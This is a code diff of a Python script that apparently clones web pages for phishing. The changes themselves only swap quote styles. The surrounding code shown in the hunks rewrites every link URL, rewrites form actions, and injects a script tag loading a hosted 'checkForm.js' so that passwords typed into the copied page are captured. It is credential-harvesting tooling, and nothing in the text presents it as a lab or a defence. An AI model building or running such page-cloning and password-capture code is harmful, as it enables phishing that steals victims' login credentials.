@@ -12,7 +12,7 @@ def replaceURL(URL,OUTPUT):
 	try:
 	# Print href URLs that will be replaced
 		print("\n".join(re.findall('<a href="?\'?([^"\'>]*)', open(OUTPUT).read())))
-		with open(OUTPUT, "r+b") as html:
+		with open(OUTPUT, 'r+b') as html:
 			# Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html,"html.parser")
 			# Find all links and replace URLs with our new text/URLs
@@ -26,7 +26,7 @@ def replaceURL(URL,OUTPUT):
 			source = xml.sax.saxutils.unescape(source)
 
 			# Write the updated URLs to output file while removing the [' and ']
-			output = open(OUTPUT, "w")
+			output = open(OUTPUT, 'w')
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print("[+] URL parsing successful. All URLs have been replaced.")
@@ -39,14 +39,14 @@ def insertPwdEval(OUTPUT):
 	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>' # Replace src with real URL for hosted checkForm.js
 	print("[+] Inserting password JavaScript.")
 	try:
-		with open(OUTPUT, "r") as html:
+		with open(OUTPUT, 'r') as html:
 			# Read in the source html and parse with BeautifulSoup
 			source = html.read()
 			index = source.find(r"</html")
 			print("[+] Closing HTML tag found at index " + str(index))
 			javascript = source[:index] + strJSLogin + source[index:]
 			soup = BeautifulSoup(javascript.replace('[','').replace(']',''))
-			output = open(OUTPUT, "w")
+			output = open(OUTPUT, 'w')
 			output.write(xml.sax.saxutils.unescape(soup.prettify()))
 			output.close()
 			print("[+] JavaScript has been inserted.")
@@ -61,7 +61,7 @@ def fixForms(OUTPUT):
 	print("[+] RegEx matches:")
 	# Open output file, read lines, and begin parsing to replace all incomplete img src URLs
 	try:
-		with open(OUTPUT, "r") as html:
+		with open(OUTPUT, 'r') as html:
 			# Read in the source html and parse with BeautifulSoup
 			soup = BeautifulSoup(html,"html.parser")
 			# Find all <form> with action attribute and replace it
@@ -73,7 +73,7 @@ def fixForms(OUTPUT):
 			source = soup.prettify()
 			source = xml.sax.saxutils.unescape(source)
 			# Write the updated form to output file while removing the [' and ']
-			output = open(OUTPUT, "w")
+			output = open(OUTPUT, 'w')
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
 			print("[+] Form parsing successful.")
